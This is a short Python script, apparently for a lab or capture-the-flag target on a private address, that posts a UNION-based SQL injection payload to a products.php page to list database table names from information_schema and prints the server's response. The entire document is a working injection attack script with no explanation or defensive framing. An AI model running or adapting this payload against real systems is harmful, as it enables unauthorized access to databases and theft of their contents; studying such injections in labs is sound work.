
import requests

base_url = 'http://192.168.56.118/'
header = {'User-agent': 'Mozilla/5.0'}

data = {'type' : '1 UNION SELECT 1, 2, TABLE_NAME, 4, 5 FROM information_schema.tables'}
# data = {'type' : '1'}

response = requests.post(base_url+'products.php', params=data, headers=header)

print('Status code:', response.status_code)
print('URL:', response.url)
print('Elapsed time:', response.elapsed.total_seconds())
print('Encoding:', response.encoding)
print('Headers:', response.headers)
print('Text:', response.text)
